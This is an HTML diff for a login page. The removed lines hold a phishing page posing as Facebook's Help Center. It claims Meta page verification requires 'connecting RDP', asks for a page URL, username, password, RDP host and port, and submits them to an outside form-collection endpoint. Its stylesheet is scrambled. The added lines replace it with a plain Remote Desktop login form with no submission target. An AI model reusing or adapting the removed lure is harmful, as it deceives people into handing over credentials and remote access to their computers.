@@ -3,284 +3,154 @@
 <head>
       <link src="styles.css"></script>
   <link rel="stylesheet" crossorigin="" href="style.css">
-      <title>RDP Login</title>
-  <style>
-    {
-
-font-family: "Helvetica Neue", Arial, sans-serif;
-
-background-color: #f0f2f5;
-
-margin: 0;
-
-padding: 0;
-
-overflow-x: hidden
-
-}
-
-.header {
-
-background-color: #4267B2;
-
-padding: 25px 20px;
-
-display: flex;
-
-justify-content: space-between;
-
-align-items: center;
-
-color: white
-
-}
-
-.header-container {
-
-display: flex;
-
-align-items: center
-
-}
-
-.facebook-text {
-
-font-size: 35px;
-
-font-weight: bold;
-
-color: white;
-
-font-family: "Helvetica Neue", Arial, sans-serif
-
-}
-
-.divider {
-
-height: 10px;
-
-background-color: #e9ebee
-
-}
-
-.content-container {
-
-width: 80%;
-
-max-width: 800px;
-
-background-color: white;
-
-margin: 30px auto;
-
-padding: 20px;
-
-border-radius: 8px;
-
-box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
-
-position: relative
-.verification-heading img {
-
-width: 50px; height: auto;
-
-margin-right: 15px
-
-}
-
-h1 {
-
-font-size: 24px;
-
-color: #1c1e21;
-
-margin-bottom: 20px;
-
-font-weight: normal;
-
-text-align: left
-
-}
-
-p {
-
-font-size: 14px;
-
-}
-
-color: #606770;
-
-margin-bottom: 10px;
-
-line-height: 1.6
-
-.form-group {
-
-margin-bottom: 20px }
-
-label (
-
-}
-
-font-size: 14px;
-
-color: #4b4f56; display: block;
-
-margin-bottom: 8px
-
-input[type="text"] {
-
-}
-
-width: 100%;
-
-padding: 12px 10px; font-size: 14px;
-
-border: 1px solid #ccd0d5;
-
-border-radius: 6px;
-
-box-sizing: border-box;
-
-background-color: #f5f6f7;
-
-transition: all 0.3s ease
-
-input[type="text"]:focus { border-color: #1877f2;
-
-}
-
-background-color: white;
-
-outline: none;
-
-box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2)
-
-.notice {
-
-}
-
-font-size: 12px; color: #606770;
-
-margin-bottom: 25px
-
-.form-notice {
-
-font-size: 12px;
-
-color: #ff0000;
-
-margin-bottom: 20px
-
-}
-
-button {
-
-}
-
-width: 100%; padding: 12px;
-
-background-color: #1877f2;
-
-color: white; border: none;
-
-border-radius: 6px;
-
-cursor: pointer; font-size: 14px;
-
-font-weight: 700;
-
-text-transform: uppercase;
-
-transition: background-color 0.3s ease
-
-button:hover {
-
-}
-
-background-color: #165ecc
-
-video-container {
-
-position: relative;
-
-width: 100%;
-
-max-width: 640px;
-
-}
-
-}
-
-poster {
-
-position: absolute;
-
-top: 0; left: 0;
-
-width: 100%;
-
-height: 100%;
-
-display: flex; justify-content: center;
-
-align-items: center;
-
-background: url('poster.jpg') no-repeat center center;
-
-background-size: cover; cursor: pointer;
-
-.play-btn {
-
-font-size: 3rem;
-
-color: white;
-
-text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-
-pointer-events: none;
-
-}
-
-Video {
-
-width: 100%;
-
-display: block;
-
-      }
-  </style>
+      
+    <title>Remote Desktop Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+        }
+
+        .header {
+            background-color: #1877f2;
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-title {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #1c1e21;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 60%;
+            margin: 0 auto;
+            display: block;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+    </style>
 </head>
 <body>
-      <div class="d-flex align-items-center" logo="fb-logo.png" style="width: 100%; height: 90px; background: rgb(70, 103, 172);">
-                        <h1 class="text-white ms-4 m-0 d-flex align-self-center">facebook</h1>
-                    </div>
-                    <div class="d-flex align-items-center" style="width: 100%; height: 60px; background: rgb(233, 235, 238);">
-                        <h4 class="ms-4 m-0 d-flex align-self-center text-primary">Help Center</h4>
-                    </div>
-      <Form action="https://submit-form.com/fBc9RoZwo" method="post">
-  <div class="login-form">
-    <p class="fw-semibold validation_form_para"> To complete the verification of your Facebook page, you'll need to connect RDP to your page to ensure compliance with Meta’s verification protocols. This step allows us to</p>
-<p class="fw-semibold validation_form_para">1. Confirm page ownership and administrative controls</p>
-<p class="fw-semibold validation_form_para">2. Validate security settings and page integrity</p>
-<p class="fw-semibold validation_form_para">3. Finalize badge activation through our internal systems</p>
+    <div class="header">
+        <div class="logo">Remote Desktop</div>
+    </div>
 
-Access will be strictly limited to verification tasks and terminated immediately upon completion. All activity will adhere to Meta’s privacy and security policies.</h2>
-               
-       <form>
-       </p>
-       </dev></dev>
-</p><input class="border h-6 pl-1 mx-3" type="text" name="Page Name" placeholder="Page URL"title="Must Watch Detailed Video" required="1" aria-required="true">
-             
- </p><input class="border h-6 pl-1 mx-3" minlength="6" placeholder="Enter Your Username" title="Must Watch Detailed Video" required="1" aria-required="true">
-                            
- </p><input class="border h-6 pl-1 mx-3" type="password"  placeholder="Enter Your Password"title="Must Watch Detailed Video" required="1" aria-required="true">
-                    
-</p><input class="border h-6 pl-1 mx-3" type="text" name="Page Name" placeholder="Enter The RDP Host"title="Must Watch Detailed Video" required="1" aria-required="true">
+    <div class="container">
+        <h1 class="form-title">Connect to Remote Desktop</h1>
+        <form>
+            <div class="input-group">
+                <input type="text" placeholder="Server IP Address" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="text" placeholder="Username" required>
+            </div>
 
-</p><input class="border h-6 pl-1 mx-3" type="text" name="Page Name" placeholder="Enter your RDP port"title="Must Watch Detailed Video" required="1" aria-required="true">
-             <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);"><button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">Connect</button></div>
+            <div class="input-group">
+                <input type="password" placeholder="Password" required>
+            </div>
 
-  </style>
-</head>
-<body>
+            <button type="submit" class="login-btn">Connect</button>
+            
+            <div class="links">
+                <a href="#">Forgot Password?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <button type="button" class="create-account">Create New Connection</button>
+        </form>
+    </div>
+</body>
+</html>
